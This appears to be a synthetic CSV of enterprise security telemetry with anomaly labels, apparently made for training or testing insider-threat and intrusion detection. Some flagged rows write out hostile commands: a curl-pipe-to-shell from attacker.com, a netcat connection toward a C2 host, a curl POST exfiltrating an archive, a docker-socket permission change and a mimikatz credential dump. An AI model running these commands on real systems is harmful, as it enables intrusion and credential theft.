timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details
2026-03-09T19:14:13.013Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,2,0,225.5,678,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:17:06.701Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,0,0,226.5,251,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:19:57.529Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,4,0,247.8,477.6,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:23:13.187Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,1,0,181.3,533.2,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:25:30.105Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,4,0,175.2,54.9,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:28:21.409Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,2,0,20,1121.1,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:31:44.570Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,4,0,115.3,929.6,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:34:14.520Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,3,0,45.5,691.6,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:37:11.363Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,0,1,95.1,285,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:40:47.339Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,2,0,173.6,430.4,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:43:13.907Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,4,0,110.2,119.9,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:45:44.285Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,2,0,61.4,765.1,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:48:51.404Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,2,0,165.2,726.9,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:52:20.393Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,0,0,200.1,628,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T19:54:38.129Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,5,0,0,8.8,23.2,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 5 consecutive attempts
2026-03-09T19:57:36.536Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,0,0,178.3,695.2,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:00:45.326Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,3,0,90.6,1000.2,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:03:12.457Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,3,0,75.5,37.8,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:06:20.133Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,3,0,149.5,42.1,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:09:23.646Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,3,0,68.3,889.9,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:11:52.456Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,1,0,65.5,1158.2,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:15:21.839Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,0,0,241,638.6,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:17:48.620Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,1,0,157.3,566,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:20:27.718Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,0,3,0,12.1,395.9,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:23:14.087Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,1,0,189.9,452.1,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:26:07.104Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,4,0,19.1,248.7,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:28:59.917Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,1,0,13.9,737.7,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:32:17.431Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,4,0,26.7,951,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:35:18.305Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,1,0,196.1,619.6,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:37:38.104Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,0,0,29.9,535.6,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:40:34.265Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,4,0,148.9,481.1,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:43:50.160Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,3,0,52.6,280.6,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:46:20.955Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,124.3,460.2,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:49:28.945Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,0,3,0,195.4,867.7,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:51:53.831Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,2,0,5.4,892.6,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:54:53.802Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,3,0,251.4,926.6,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T20:58:01.809Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,2,0,16.1,1208.6,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:01:23.742Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,0,0,184.1,260.7,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:04:06.251Z,usr-102,bob.martinez,FINANCE,10.0.5.45,USB_ACTIVITY,0,83,1,83928.9,140.6,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-09T21:07:06.550Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,4,0,136.8,607.4,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:10:02.136Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,2,0,89,113.9,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:12:42.637Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,4,0,30,421,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:15:15.702Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,USB_ACTIVITY,0,40,1,115432.4,235.3,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-09T21:18:26.129Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,4,0,79.7,103.7,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:21:37.206Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,1,0,60.6,870.6,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:24:06.629Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,0,0,168.7,1205,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:26:52.772Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,USB_ACTIVITY,0,93,1,107487.9,131,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-09T21:29:55.718Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,0,0,79.3,911.4,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:32:22.313Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,1,0,43.8,351.8,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:36:00.853Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,1,0,100.2,807.5,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:38:32.016Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,1,0,111.7,23.4,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:40:48.760Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,235.7,864.5,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:44:04.796Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,2,0,225.8,661.8,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:47:26.705Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,1,0,51.6,417.6,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:49:37.534Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,1,30,0,5249.7,17847.9,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-09T21:52:53.819Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,USB_ACTIVITY,0,16,1,48039.4,57,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-09T21:55:17.215Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,1,0,23.4,693.8,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T21:58:32.771Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,1,0,27.2,295,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:01:51.626Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,0,0,21.8,1000.3,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:04:47.972Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,4,0,8.9,848.4,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:07:12.009Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,8,0,0,2.9,16,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 8 consecutive attempts
2026-03-09T22:09:48.890Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,0,0,54.8,1056,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:13:18.652Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,3,0,164.6,721,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:16:17.523Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,4,0,0,14.5,12.6,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 4 consecutive attempts
2026-03-09T22:18:35.774Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,0,0,128.2,1156.8,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:21:23.615Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,278,0,318970.6,143.7,c2-beacon-185.xyz,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (278 files)
2026-03-09T22:24:50.687Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,1,0,166.6,424.7,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:27:32.726Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,3,0,161.6,1109.1,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:29:49.374Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,4,0,86.3,328.8,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:33:13.295Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,0,0,154,605.7,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:36:26.867Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,4,0,192.2,1001.9,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:38:48.029Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,1,0,107.4,901.3,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:41:19.815Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,SHELL_EXECUTION,2,10,0,172.4,459.7,darknet-gateway.to,curl -s http://attacker.com/mal.sh | sh,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-09T22:44:27.126Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,3,0,77.5,410.4,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:47:43.175Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,1,0,0,139.5,597.9,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:50:37.327Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,251.6,517.2,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:53:13.601Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,1,0,243.3,319.2,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:56:05.686Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,4,0,14.4,358.2,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T22:58:55.177Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,4,0,181.8,493.8,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:01:34.159Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,4,0,251.2,931.4,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:04:20.100Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,1,0,183.8,879.3,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:07:29.263Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,2,0,46.6,306.4,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:10:25.085Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,4,0,103.5,293.4,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:13:09.143Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,3,0,227,970.1,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:16:45.935Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,3,0,234.9,1054.1,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:19:21.848Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,0,0,215.2,628,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:22:07.120Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,1,0,152.9,1029.5,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:25:19.368Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,1,3,0,172,411.1,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:27:40.258Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,3,0,170.2,1208.6,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:30:47.141Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,3,0,31.7,526.8,internal-portal.corp,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:33:10.187Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,2,0,194.4,763.3,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:36:12.742Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,1,4,0,65.2,1189.7,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:38:55.055Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,2,0,57,204,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:42:35.768Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,4,0,194.9,1131.5,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:44:54.618Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,2,0,45.5,800.9,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:47:49.455Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,3,0,236.9,611.9,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:51:20.324Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,0,0,149.2,370.7,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:53:27.665Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,0,0,15.8,691.5,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:57:09.194Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,2,0,50.7,1037.3,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-09T23:59:17.428Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,4,0,23.1,1048.3,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:02:07.070Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,3,0,164.5,552.9,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:05:07.572Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,SHELL_EXECUTION,0,1,0,33.7,58.3,temp-dropzone.cc,chmod 777 /var/run/docker.sock,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-10T00:08:32.317Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,4,0,57.9,750.1,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:10:49.476Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,4,0,233.4,203.2,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:13:57.330Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,4,0,46.4,997.1,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:17:01.315Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,2,0,19.2,170.4,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:19:30.925Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,1,0,59.3,840.5,internal-portal.corp,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:22:50.430Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,4,0,54.6,775.4,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:25:34.467Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,219,0,310140.5,130.1,darknet-gateway.to,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (219 files)
2026-03-10T00:28:07.369Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,1,0,0,152.8,938.2,docs.google.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:31:08.117Z,usr-108,henry.todd,FINANCE,10.0.5.12,SHELL_EXECUTION,2,4,0,292.8,323,tunnel-ngrok.io,mimikatz.exe privilege::debug sekurlsa::logonpasswords,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-10T00:34:20.578Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,202.1,272.4,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:37:27.668Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,12,0,0,2.5,17.2,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 12 consecutive attempts
2026-03-10T00:39:59.183Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,1,0,215,701.9,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:42:18.215Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,1,2,0,104.9,33.7,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:45:28.312Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,3,0,12.4,116.2,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:48:09.401Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,USB_ACTIVITY,0,87,1,118982.5,247,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-10T00:51:42.850Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,1,0,200.2,581.5,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:53:47.378Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,1,2,0,208.8,770,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:57:21.656Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,2,0,36.1,318.5,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T00:59:38.244Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,2,0,40.2,461.1,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:03:09.121Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,3,0,228.4,857.6,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:05:21.713Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,12.7,927.9,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:08:17.841Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,1,0,136.5,830.9,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:11:53.171Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,1,0,227.1,262.4,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-10T01:14:07.286Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,1,0,33.7,442,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
